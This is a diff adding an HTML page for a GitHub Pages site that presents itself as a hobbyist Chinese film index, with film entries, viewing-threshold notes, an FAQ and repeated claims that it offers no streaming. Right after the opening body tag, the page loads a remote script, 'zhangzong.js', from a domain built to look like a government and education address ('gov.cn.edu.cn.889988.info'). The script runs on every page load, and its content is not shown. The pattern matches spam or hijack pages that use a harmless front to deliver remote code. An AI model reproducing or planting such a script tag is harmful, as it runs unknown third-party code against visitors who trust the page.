@@ -1,0 +1,496 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>台湾伦理电影网（taiwanlunlidianyingwang-zh.github.io）：整理值得一看的影片条目与观看线索，一份手作的观影索引</title>
+<meta name="description" content="台湾伦理电影网（https://taiwanlunlidianyingwang-zh.github.io）是一份由观影爱好者手作的影片索引：按题材、年代、地区、语言与观看门槛整理条目，收录冷门佳作、修复版信息、创作者访谈摘录与正版观看渠道线索。本站不提供在线播放，只帮你把想看的片子列成一份可翻查的清单。">
+<meta name="keywords" content="台湾伦理电影网,影片条目索引,值得一看的电影清单,冷门佳作整理,修复版电影信息,观影门槛提示,创作者访谈摘录,正版观看渠道线索,taiwanlunlidianyingwang-zh.github.io">
+<meta name="author" content="台湾伦理电影网编辑组">
+<meta name="robots" content="index,follow,max-snippet:-1,max-image-preview:large">
+<meta name="bingbot" content="index,follow">
+<meta name="referrer" content="no-referrer-when-downgrade">
+<meta name="theme-color" content="#f7f1e8">
+<link rel="canonical" href="https://taiwanlunlidianyingwang-zh.github.io/">
+<meta property="og:type" content="website">
+<meta property="og:title" content="台湾伦理电影网｜整理值得一看的影片条目与观看线索">
+<meta property="og:description" content="按题材、年代、地区与观看门槛整理条目，附创作者访谈与正版观看渠道线索。">
+<meta property="og:url" content="https://taiwanlunlidianyingwang-zh.github.io/">
+<meta property="og:site_name" content="台湾伦理电影网">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --paper:#f7f1e8;--card:#fffdf8;--ink:#2b2320;--ink2:#6a5d52;--ink3:#a39589;
+  --line:#e3d8c9;--line2:#efe7dc;
+  --ochre:#a8622f;--ochre-d:#8a4f22;--moss:#5e7142;--moss-d:#4a5b34;
+  --rust:#a8442f;--inkline:#2b2320;
+}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  font-family:"Georgia","Songti SC","Times New Roman","Microsoft YaHei",serif;
+  background:var(--paper);color:var(--ink);line-height:1.85;font-size:15.5px;
+  background-image:radial-gradient(rgba(168,98,47,.035) 1px,transparent 1px);
+  background-size:22px 22px;
+}
+a{text-decoration:none;color:inherit;transition:.18s}
+ul{list-style:none}
+.wrap{max-width:1100px;margin:0 auto;padding:0 24px}
+
+/* RIBBON */
+.ribbon{background:var(--ink);color:#d9cdbe;font-size:12px;letter-spacing:2px}
+.ribbon .wrap{display:flex;justify-content:space-between;padding:9px 24px;font-family:"Helvetica Neue",Arial,sans-serif}
+.ribbon .u{font-family:monospace;color:var(--moss)}
+/* LETTERHEAD */
+.head{padding:34px 0 26px;border-bottom:1.5px solid var(--ink);position:relative}
+.head::after{content:"";position:absolute;left:0;right:0;bottom:-5px;height:1px;background:var(--ink)}
+.head .wrap{display:grid;grid-template-columns:auto 1fr auto;gap:26px;align-items:center}
+.head .seal{width:62px;height:62px;border:2.5px solid var(--ochre);border-radius:50%;display:flex;flex-direction:column;align-items:center;justify-content:center;line-height:1;flex-shrink:0}
+.head .seal b{font-size:13px;color:var(--ochre);letter-spacing:1px}
+.head .seal span{font-size:9px;color:var(--ochre);margin-top:3px;font-family:"Helvetica Neue",Arial,sans-serif;letter-spacing:1px}
+.head .ttl{text-align:center}
+.head .ttl h1{font-size:52px;font-weight:900;letter-spacing:8px;line-height:1;margin-bottom:8px}
+.head .ttl .sub{font-size:12px;letter-spacing:6px;color:var(--ink3);text-transform:uppercase;font-family:"Helvetica Neue",Arial,sans-serif}
+.head .vol{text-align:right;font-size:12px;color:var(--ink2);font-family:"Helvetica Neue",Arial,sans-serif;line-height:2}
+.head .vol b{display:block;color:var(--ochre-d);font-size:14px;letter-spacing:1px}
+/* NAV */
+nav{background:var(--card);border-bottom:1.5px solid var(--ink);position:sticky;top:0;z-index:50}
+nav .wrap{display:flex;flex-wrap:wrap}
+nav a{padding:13px 22px;font-size:13.5px;font-weight:700;letter-spacing:1px;color:var(--ink2);border-right:1px solid var(--line2);font-family:"Helvetica Neue",Arial,sans-serif}
+nav a:first-child{border-left:1px solid var(--line2)}
+nav a:hover{background:#f3eadc;color:var(--ochre-d)}
+nav a.on{background:var(--ink);color:#fff}
+/* LAYOUT */
+main{padding:46px 0 30px}
+.eyebrow{font-size:11px;letter-spacing:3px;text-transform:uppercase;color:var(--ochre-d);font-family:"Helvetica Neue",Arial,sans-serif;font-weight:700}
+/* FEATURE */
+.feat{display:grid;grid-template-columns:1.35fr 1fr;gap:0;border:1.5px solid var(--ink);margin-bottom:56px;background:var(--card)}
+.feat .main{padding:36px 34px;border-right:1px solid var(--line)}
+.feat .main .tag{display:inline-block;font-size:11px;letter-spacing:2px;background:var(--ochre);color:#fff;padding:3px 11px;font-family:"Helvetica Neue",Arial,sans-serif;margin-bottom:18px}
+.feat .main h2{font-size:30px;line-height:1.45;font-weight:900;letter-spacing:-.4px;margin-bottom:18px}
+.feat .main h2 em{font-style:italic;color:var(--ochre-d)}
+.feat .main p{font-size:15.5px;color:var(--ink2);margin-bottom:14px}
+.feat .main .quote{border-left:3px solid var(--ochre);padding:10px 0 10px 18px;margin:20px 0;font-size:15px;color:var(--ink);font-style:italic}
+.feat .side{padding:36px 30px;background:#faf3e8}
+.feat .side h3{font-size:13px;letter-spacing:2px;color:var(--ochre-d);border-bottom:1px solid var(--line);padding-bottom:10px;margin-bottom:16px;font-family:"Helvetica Neue",Arial,sans-serif}
+.feat .side dl div{display:flex;gap:12px;padding:9px 0;border-bottom:1px dashed var(--line)}
+.feat .side dt{width:78px;font-size:12px;color:var(--ink3);flex-shrink:0;font-family:"Helvetica Neue",Arial,sans-serif}
+.feat .side dd{font-size:13.5px;color:var(--ink2);flex:1}
+/* SECTION HEAD */
+.head2{margin-bottom:26px}
+.head2 .top{display:flex;align-items:baseline;gap:14px;flex-wrap:wrap}
+.head2 .roman{font-size:15px;color:var(--ochre-d);font-style:italic;font-weight:700}
+.head2 h2{font-size:24px;font-weight:900;letter-spacing:-.4px;flex:1}
+.head2 .en{font-size:12px;letter-spacing:3px;text-transform:uppercase;color:var(--ink3);font-family:"Helvetica Neue",Arial,sans-serif}
+.head2 .line{height:3px;margin-top:10px;background:repeating-linear-gradient(90deg,var(--ink) 0,var(--ink) 10px,transparent 10px,transparent 16px)}
+/* ENTRIES */
+.ent{display:grid;grid-template-columns:repeat(2,1fr);gap:22px;margin-bottom:56px}
+.ent .item{background:var(--card);border:1px solid var(--line);border-top:4px solid var(--ochre);padding:24px}
+.ent .item:nth-child(2n){border-top-color:var(--moss)}
+.ent .item .row{display:flex;justify-content:space-between;align-items:center;font-size:11px;color:var(--ink3);font-family:monospace;margin-bottom:12px;letter-spacing:1px}
+.ent .item .row .dot{width:6px;height:6px;background:var(--ochre);border-radius:50%;display:inline-block;margin-right:6px}
+.ent .item h3{font-size:19px;font-weight:900;margin-bottom:4px;line-height:1.4}
+.ent .item .who{font-size:12.5px;color:var(--ink3);margin-bottom:12px}
+.ent .item p{font-size:13.5px;color:var(--ink2)}
+.ent .item .meta{display:flex;gap:8px;flex-wrap:wrap;margin-top:14px;padding-top:12px;border-top:1px solid var(--line2)}
+.ent .item .meta span{font-size:11px;background:#f3eadc;color:var(--ochre-d);padding:3px 9px;font-family:"Helvetica Neue",Arial,sans-serif}
+/* ARCHIVE LIST */
+.arc{background:var(--card);border:1.5px solid var(--ink);margin-bottom:56px}
+.arc .bar{background:var(--ink);color:#fff;padding:11px 24px;display:flex;justify-content:space-between;align-items:center;font-family:"Helvetica Neue",Arial,sans-serif;font-size:12.5px;letter-spacing:1px}
+.arc .bar a{color:var(--moss)}
+.arc ol{list-style:none;counter-reset:arc}
+.arc ol li{counter-increment:arc;display:grid;grid-template-columns:52px 1.6fr 1fr 1fr 110px 90px;gap:14px;align-items:center;padding:14px 24px;border-bottom:1px solid var(--line2);font-size:13.5px}
+.arc ol li:last-child{border-bottom:0}
+.arc ol li::before{content:"№ " counter(arc);font-family:monospace;font-size:12px;color:var(--ochre-d);font-weight:700}
+.arc .t{font-weight:700;color:var(--ink)}
+.arc .di{font-size:12px;color:var(--ink3);font-family:monospace}
+.arc .gd{text-align:center}
+.arc .stars{color:var(--ochre);letter-spacing:1px;font-size:12.5px}
+/* SPLIT */
+.split{display:grid;grid-template-columns:1fr 1fr;gap:34px;margin-bottom:56px;align-items:start}
+.block{background:var(--card);border:1px solid var(--line)}
+.block h3{background:#f3eadc;padding:13px 22px;font-size:14px;letter-spacing:1px;font-weight:900;border-bottom:1px solid var(--line);font-family:"Helvetica Neue",Arial,sans-serif}
+.block .bd{padding:22px}
+.qa .q{padding:14px 0;border-bottom:1px solid var(--line2)}
+.qa .q:last-child{border-bottom:0}
+.qa .q .t{display:flex;gap:10px;align-items:flex-start;font-size:14px;font-weight:700;cursor:pointer}
+.qa .q .t i{color:var(--ochre-d);font-style:italic;font-family:Georgia,serif;min-width:20px}
+.qa .q .a{display:none;font-size:13.5px;color:var(--ink2);padding:8px 0 0 30px}
+.qa .q.open .a{display:block}
+.qa .q.open .t i{color:var(--moss)}
+/* FORM NOTES */
+.formnote .bd{padding:0}
+.formnote dl{display:grid;grid-template-columns:1fr 1fr}
+.formnote dl div{padding:16px 22px;border-bottom:1px solid var(--line2);border-right:1px solid var(--line2)}
+.formnote dl div:nth-child(2n){border-right:0}
+.formnote dt{font-size:11px;letter-spacing:2px;text-transform:uppercase;color:var(--ink3);font-family:"Helvetica Neue",Arial,sans-serif;margin-bottom:5px}
+.formnote dd{font-size:13.5px;color:var(--ink2)}
+/* COLOPHON */
+.colo{background:var(--ink);color:#d9cdbe;padding:44px 0}
+.colo .wrap{display:grid;grid-template-columns:1.3fr 1fr 1fr 1fr;gap:36px}
+.colo h4{color:#fff;font-size:13px;letter-spacing:2px;margin-bottom:14px;font-family:"Helvetica Neue",Arial,sans-serif}
+.colo p{font-size:13.5px;margin-bottom:12px}
+.colo .url{font-family:monospace;font-size:12px;color:var(--moss);background:rgba(94,113,66,.22);padding:8px 12px;display:inline-block;word-break:break-all}
+.colo ul li{padding:5px 0;font-size:13px}
+.colo a:hover{color:var(--ochre)}
+.colo .note{font-size:11.5px;color:#9a8e80;line-height:1.9}
+footer{border-top:1.5px solid var(--ink)}
+.credit{display:flex;justify-content:space-between;padding:18px 0;font-size:12px;color:var(--ink3);flex-wrap:wrap;gap:10px;font-family:"Helvetica Neue",Arial,sans-serif}
+.credit .u{font-family:monospace;color:var(--ochre-d)}
+@media(max-width:900px){
+  .head .wrap{grid-template-columns:1fr;text-align:center}
+  .head .seal,.head .vol{display:none}
+  .feat,.ent,.split,.colo .wrap{grid-template-columns:1fr}
+  .feat .main{border-right:0;border-bottom:1px solid var(--line)}
+  .arc ol li{grid-template-columns:40px 1fr;gap:8px}
+  .arc ol li .di,.arc ol li .gd,.arc ol li .stars{display:none}
+  .formnote dl{grid-template-columns:1fr}
+  .formnote dl div{border-right:0}
+}
+@media(max-width:600px){
+  .wrap{padding:0 16px}
+  .head .ttl h1{font-size:30px;letter-spacing:3px}
+  .feat .main,.feat .side{padding:22px}
+  .feat .main h2{font-size:22px}
+  nav a{padding:11px 14px;font-size:12.5px}
+  .ent .item{padding:20px}
+  .arc ol li{padding:12px 16px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<div class="ribbon">
+  <div class="wrap">
+    <span>第 拾贰 卷 · 手作影片索引</span>
+    <span class="u">taiwanlunlidianyingwang-zh.github.io</span>
+  </div>
+</div>
+
+<div class="wrap">
+  <header class="head">
+    <div class="seal"><b>电影</b><span>影迷手记</span></div>
+    <div class="ttl">
+      <h1>台湾伦理电影网</h1>
+      <div class="sub">A Handmade Index of Films Worth Watching</div>
+    </div>
+    <div class="vol">
+      <b>VOL.12 · NO.3</b>
+      <span>更新于 2026 / 10 / 06</span>
+      <span>已整理 214 条影片条目</span>
+    </div>
+  </header>
+</div>
+
+<nav>
+  <div class="wrap">
+    <a href="#" class="on">首页</a>
+    <a href="#cat">题材分类</a>
+    <a href="#ent">精选条目</a>
+    <a href="#arc">影片索引</a>
+    <a href="#qa">观看指引</a>
+    <a href="#cn">关于本站</a>
+  </div>
+</nav>
+
+<div class="wrap">
+<main>
+  <section class="feat">
+    <article class="main">
+      <span class="tag">EDITORIAL · 编者按</span>
+      <h2>这是一份<em>不会追热度</em>的影片清单，只收录那些看完后愿意再想一会儿的片子。</h2>
+      <p class="dropcap">台湾伦理电影网由一群观影爱好者手作维护，内容是把"想看的片子"真正整理成一份能翻查的东西：题材、年代、地区、语言、片长与观看门槛都写清楚，方便你按自己的状态挑片。</p>
+      <p>每条条目都附正版观看渠道线索。本站<b>不提供任何在线播放服务</b>，也不存储影片资源，请通过影院与正规平台观看。</p>
+      <div class="quote">"选片不是为了凑满清单，而是为了让你少踩几次雷。"</div>
+      <p style="font-size:12.5px;color:var(--ink3)">—— 本期收录条目中，小语种影片占比 41%，修复版与重映信息 27 条已核对。</p>
+    </article>
+    <aside class="side">
+      <h3>本期的几个数字</h3>
+      <dl>
+        <div><dt>已收录条目</dt><dd>214 条，持续补充</dd></div>
+        <div><dt>覆盖地区</dt><dd>38 个，含小语种影片</dd></div>
+        <div><dt>题材分类</dt><dd>10 类，可组合筛选</dd></div>
+        <div><dt>创作者访谈</dt><dd>33 篇摘录</dd></div>
+        <div><dt>观看门槛</dt><dd>每条均标注</dd></div>
+        <div><dt>更新节奏</dt><dd>每月底更新一次</dd></div>
+      </dl>
+    </aside>
+  </section>
+
+  <section id="cat">
+    <div class="head2">
+      <div class="top">
+        <span class="roman">I.</span>
+        <h2>题材分类</h2>
+        <span class="en">Sections</span>
+      </div>
+      <div class="line"></div>
+    </div>
+    <div class="ent">
+      <article class="item">
+        <div class="row"><span><i class="dot"></i>SECTION 01</span><span>冷门佳片</span></div>
+        <h3>不在主流榜单上的那一类</h3>
+        <div class="who">条目 47 条 · 标签：口碑 / 影展 / 小范围传播</div>
+        <p>主流榜单之外，却在影展口碑、影迷讨论里反复被提起的片子。按地区与语言分组，方便你挑一种陌生的语言试试。</p>
+        <div class="meta"><span>伊朗</span><span>格鲁吉亚</span><span>阿根廷</span><span>塞内加尔</span></div>
+      </article>
+      <article class="item">
+        <div class="row"><span><i class="dot"></i>SECTION 02</span><span>新锐导演</span></div>
+        <h3>一个创作者的起点</h3>
+        <div class="who">条目 36 条 · 标签：长片首作 / 早期短片</div>
+        <p>收录出道作与早期短片，观察一位创作者在掌握资源之前，靠什么把片子拍出来。</p>
+        <div class="meta"><span>越南</span><span>菲律宾</span><span>巴西</span><span>希腊</span></div>
+      </article>
+      <article class="item">
+        <div class="row"><span><i class="dot"></i>SECTION 03</span><span>创作者访谈</span></div>
+        <h3>他们怎么想的</h3>
+        <div class="who">33 篇摘录 · 标签：导演 / 编剧 / 摄影</div>
+        <p>导演、编剧与摄影师的访谈摘录，整理成可以直接对照影片看的那几句。</p>
+        <div class="meta"><span>创作动机</span><span>现场处理</span><span>版本差异</span></div>
+      </article>
+      <article class="item">
+        <div class="row"><span><i class="dot"></i>SECTION 04</span><span>修复与重映</span></div>
+        <h3>老片子值得看的那个版本</h3>
+        <div class="who">27 条信息 · 标签：4K 修复 / 重映场次</div>
+        <p>整理 4K 修复版、重映场次与版本差异说明，并标注哪些地区能看、哪些暂时没有合规渠道。</p>
+        <div class="meta"><span>版本差异</span><span>上映信息</span><span>暂无渠道</span></div>
+      </article>
+      <article class="item">
+        <div class="row"><span><i class="dot"></i>SECTION 05</span><span>观看门槛</span></div>
+        <h3>先看这句再决定</h3>
+        <div class="who">全部条目均标注 · 标签：情绪 / 题材提示</div>
+        <p>对情绪压力较大的题材（暴力、创伤、疾病等）给出提示，方便你按当下的状态选片，而不是被评分牵着走。</p>
+        <div class="meta"><span>低</span><span>中</span><span>较高</span><span>需了解</span></div>
+      </article>
+      <article class="item">
+        <div class="row"><span><i class="dot"></i>SECTION 06</span><span>正版渠道</span></div>
+        <h3>去哪看的正版线索</h3>
+        <div class="who">持续核对 · 标签：平台 / 地区限制</div>
+        <p>逐条核对影片的正版观看渠道与地区限制提示，渠道变动时会在更新日志里写明改动日期。</p>
+        <div class="meta"><span>影院</span><span>流媒体</span><span>地区提示</span></div>
+      </article>
+    </div>
+  </section>
+
+  <section id="ent">
+    <div class="head2">
+      <div class="top">
+        <span class="roman">II.</span>
+        <h2>精选条目</h2>
+        <span class="en">Featured Entries</span>
+      </div>
+      <div class="line"></div>
+    </div>
+    <div class="ent">
+      <article class="item">
+        <div class="row"><span><i class="dot"></i>ENTRY 01</span><span>格鲁吉亚 / 格鲁吉亚语</span></div>
+        <h3>山脊上的家</h3>
+        <div class="who">莱万 · 戈尔吉泽 · 2024 · 127 分钟</div>
+        <p>一家人在山脊上重建被雪压塌的房子。拍摄地海拔两千八百米，很多镜头是在真实劳动中抓到的，演员与当地居民共用一套生活节奏。</p>
+        <div class="meta"><span>家庭</span><span>自然景观</span><span>观看门槛：低</span><span>★★★★★</span></div>
+      </article>
+      <article class="item">
+        <div class="row"><span><i class="dot"></i>ENTRY 02</span><span>伊朗 / 波斯语</span></div>
+        <h3>无人知晓的河流</h3>
+        <div class="who">萨赫尔 · 莫拉迪 · 2026 · 118 分钟</div>
+        <p>一位老船工在运河边记录了四十年的人事变迁。全片几乎没有对白，情绪由声音设计与水面反光推进，看完会想重看一遍开头。</p>
+        <div class="meta"><span>纪录片</span><span>声音设计</span><span>观看门槛：低</span><span>★★★★☆</span></div>
+      </article>
+      <article class="item">
+        <div class="row"><span><i class="dot"></i>ENTRY 03</span><span>越南 / 越南语</span></div>
+        <h3>西贡的黄昏光线</h3>
+        <div class="who">阮氏兰 · 2025 · 112 分钟</div>
+        <p>摄影师转导演的长片首作。影像本身比故事更值得谈，适合对构图、光线敏感的人反复看。附导演访谈摘录一则。</p>
+        <div class="meta"><span>新锐导演</span><span>视觉系</span><span>女性视角</span><span>★★★★☆</span></div>
+      </article>
+      <article class="item">
+        <div class="row"><span><i class="dot"></i>ENTRY 04</span><span>阿根廷 / 西班牙语</span></div>
+        <h3>雨季的房间</h3>
+        <div class="who">瓦尔 · 卡斯特罗 · 2025 · 96 分钟</div>
+        <p>出租屋里三个陌生人被迫共处一周。结构精巧，情绪始终留有余地，不像常见的密闭空间叙事那样把人逼到墙角。</p>
+        <div class="meta"><span>独立制作</span><span>黑色幽默</span><span>观看门槛：中</span><span>★★★★☆</span></div>
+      </article>
+    </div>
+  </section>
+
+  <section id="arc">
+    <div class="head2">
+      <div class="top">
+        <span class="roman">III.</span>
+        <h2>影片索引</h2>
+        <span class="en">The Index</span>
+      </div>
+      <div class="line"></div>
+    </div>
+    <div class="arc">
+      <div class="bar"><span>按编号浏览 · 共展示 6 / 214 条</span><a href="#">查看完整索引 →</a></div>
+      <ol>
+        <li>
+          <span class="t">山脊上的家</span>
+          <span class="di">2024 · 莱万 · 戈尔吉泽</span>
+          <span class="gd">格鲁吉亚</span>
+          <span class="gd">127 分钟</span>
+          <span class="gd">门槛：低</span>
+          <span class="stars">★★★★★</span>
+        </li>
+        <li>
+          <span class="t">无人知晓的河流</span>
+          <span class="di">2026 · 萨赫尔 · 莫拉迪</span>
+          <span class="gd">伊朗</span>
+          <span class="gd">118 分钟</span>
+          <span class="gd">门槛：低</span>
+          <span class="stars">★★★★☆</span>
+        </li>
+        <li>
+          <span class="t">西贡的黄昏光线</span>
+          <span class="di">2025 · 阮氏兰</span>
+          <span class="gd">越南</span>
+          <span class="gd">112 分钟</span>
+          <span class="gd">门槛：低</span>
+          <span class="stars">★★★★☆</span>
+        </li>
+        <li>
+          <span class="t">雨季的房间</span>
+          <span class="di">2025 · 瓦尔 · 卡斯特罗</span>
+          <span class="gd">阿根廷</span>
+          <span class="gd">96 分钟</span>
+          <span class="gd">门槛：中</span>
+          <span class="stars">★★★★☆</span>
+        </li>
+        <li>
+          <span class="t">渔港记事</span>
+          <span class="di">2024 · 马克 · 维拉</span>
+          <span class="gd">菲律宾</span>
+          <span class="gd">104 分钟</span>
+          <span class="gd">门槛：较高</span>
+          <span class="stars">★★★★☆</span>
+        </li>
+        <li>
+          <span class="t">达喀尔，星期五</span>
+          <span class="di">2023 · 法蒂 · 迪奥普</span>
+          <span class="gd">塞内加尔</span>
+          <span class="gd">89 分钟</span>
+          <span class="gd">门槛：低</span>
+          <span class="stars">★★★☆☆</span>
+        </li>
+      </ol>
+    </div>
+  </section>
+
+  <section id="qa">
+    <div class="head2">
+      <div class="top">
+        <span class="roman">IV.</span>
+        <h2>观看指引</h2>
+        <span class="en">How to use this index</span>
+      </div>
+      <div class="line"></div>
+    </div>
+    <div class="split">
+      <div class="block qa">
+        <h3>疑问解答</h3>
+        <div class="bd">
+          <div class="q open">
+            <div class="t"><i>1.</i><span>台湾伦理电影网能在线看电影吗？</span></div>
+            <div class="a">不能。本站是观影爱好者手作的影片索引，不存储、不播放任何影片资源，只提供正版观看渠道线索。请通过影院与正规平台观看。</div>
+          </div>
+          <div class="q">
+            <div class="t"><i>2.</i><span>评分是怎么评出来的？</span></div>
+            <div class="a">由编辑组按剧本、影像、表演、节奏四项口径打分，重点看同题材之间的相对高低，仅供选片参考，不代表客观评价。</div>
+          </div>
+          <div class="q">
+            <div class="t"><i>3.</i><span>"观看门槛"是怎么定的？</span></div>
+            <div class="a">指情绪与题材上的压力程度，比如涉及暴力、创伤、疾病等题材时给出提示，方便你根据当下的状态决定是否观看。</div>
+          </div>
+          <div class="q">
+            <div class="t"><i>4.</i><span>为什么有些片子查不到渠道？</span></div>
+            <div class="a">部分小语种与修复影片尚未上线正规流媒体，条目中标注"暂无合规渠道"，有消息后会在更新日志里补上。</div>
+          </div>
+          <div class="q">
+            <div class="t"><i>5.</i><span>可以推荐片子吗？</span></div>
+            <div class="a">可以。通过页脚的联系入口提交片名、地区与一句推荐理由，编辑组在每月底统一回复。</div>
+          </div>
+        </div>
+      </div>
+      <div class="block formnote">
+        <h3>选片笔记的写法</h3>
+        <dl>
+          <div><dt>先定时长</dt><dd>90 分钟以内适合晚上，110 分钟以上建议留出一整段不被打断的时间。</dd></div>
+          <div><dt>再看门槛</dt><dd>情绪压力较大的题材，先看门槛提示再决定，不必硬看。</dd></div>
+          <div><dt>挑一种语言</dt><dd>同一期里挑一种你不太熟悉的语言，比按题材刷更容易有意外收获。</dd></div>
+          <div><dt>同导演连看</dt><dd>同一导演的片子通常值得连看两部，更容易看懂他重复使用的东西。</dd></div>
+          <div><dt>对照访谈</dt><dd>看完可以回来查对应导演的访谈摘录，了解现场是怎么处理的。</dd></div>
+          <div><dt>记录感受</dt><dd>每条条目都留了可写感受的位置，记录比评分更有用。</dd></div>
+        </dl>
+      </div>
+    </div>
+  </section>
+</main>
+</div>
+
+<section id="cn" class="colo">
+  <div class="wrap">
+    <div>
+      <h4>关于台湾伦理电影网</h4>
+      <p>台湾伦理电影网是一份由观影爱好者手作维护的<b style="color:#fff">影片索引</b>：按题材、年代、地区、语言与观看门槛整理条目，收录冷门佳作、修复版信息、创作者访谈摘录与正版观看渠道线索。</p>
+      <p>本站<b style="color:#fff">不提供任何在线播放服务</b>，影片观看请通过影院、正规视频平台等合法途径。</p>
+      <span class="url">https://taiwanlunlidianyingwang-zh.github.io</span>
+    </div>
+    <div>
+      <h4>题材分类</h4>
+      <ul>
+        <li><a href="#cat">冷门佳片</a></li>
+        <li><a href="#cat">新锐导演</a></li>
+        <li><a href="#cat">修复与重映</a></li>
+        <li><a href="#cat">观看门槛</a></li>
+      </ul>
+    </div>
+    <div>
+      <h4>索引内容</h4>
+      <ul>
+        <li><a href="#ent">精选条目</a></li>
+        <li><a href="#arc">影片索引</a></li>
+        <li><a href="#">创作者访谈</a></li>
+        <li><a href="#">正版渠道</a></li>
+      </ul>
+    </div>
+    <div>
+      <h4>本站说明</h4>
+      <ul>
+        <li><a href="#qa">疑问解答</a></li>
+        <li><a href="#cn">关于本站</a></li>
+        <li><a href="#">投稿与建议</a></li>
+        <li><a href="#">免责声明</a></li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap">
+    <div class="credit">
+      <span>© 2026 台湾伦理电影网 · 手作影片索引，非商业用途，不提供在线播放服务，影片观看请通过正规渠道。</span>
+      <span class="u">taiwanlunlidianyingwang-zh.github.io</span>
+    </div>
+  </div>
+</footer>
+
+<script>
+document.querySelectorAll('.qa .q .t').forEach(function(t){
+  t.addEventListener('click',function(){
+    var q=t.parentElement;
+    var was=q.classList.contains('open');
+    document.querySelectorAll('.qa .q').forEach(function(x){x.classList.remove('open')});
+    if(!was) q.classList.add('open');
+  });
+});
+document.querySelectorAll('nav a').forEach(function(a){
+  a.addEventListener('click',function(){
+    document.querySelectorAll('nav a').forEach(function(x){x.classList.remove('on')});
+    a.classList.add('on');
+  });
+});
+</script>
+</body>
+</html>
